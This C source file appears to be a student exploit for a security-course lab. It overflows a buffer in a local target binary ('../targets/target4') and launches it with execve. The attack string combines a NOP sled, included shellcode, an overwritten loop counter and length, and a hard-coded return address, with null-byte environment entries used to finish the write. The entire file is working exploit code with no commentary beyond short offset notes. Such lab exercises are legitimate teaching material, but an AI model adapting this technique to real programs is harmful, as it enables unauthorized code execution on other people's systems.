#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

#define NOP 0x90
#define I_VAL "\xa4\x00\x00\x00"  // reset I to 164, to overwrite len
#define LEN_VAL "\xB8\x00\x00\x00"  // len = 188 - 4, since i = 164 to 168 run twice
#define RET_ADDR "\xf0\xfd\x21\x30" 

int main(void)
{
  char attack_string[189];

	memset(attack_string, NOP, 189);
	memcpy(attack_string, shellcode, strlen(shellcode));
  memcpy(&attack_string[168], I_VAL, 4);
	memcpy(&attack_string[172], LEN_VAL, 4);
	memcpy(&attack_string[184], RET_ADDR, 4);
	attack_string[188] = '\0';

  char *args[3];
  char *env[7];

  args[0] = TARGET; 
  args[1] = attack_string; 
  args[2] = NULL;

  env[0] = "\x00"; // 2 most sig bytes of I_VAL
  env[1] = "\x00";
  env[2] = &attack_string[172];
  env[3] = "\x00"; // 2 most sig bytes of LEN_VAL
  env[4] = "\x00";
  env[5] = &attack_string[176];
  env[6] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
// 0x3021fea8 RA
// 0x3021fdf0 Buf
// 0x3021fe9c len
// 0x3021fe98 i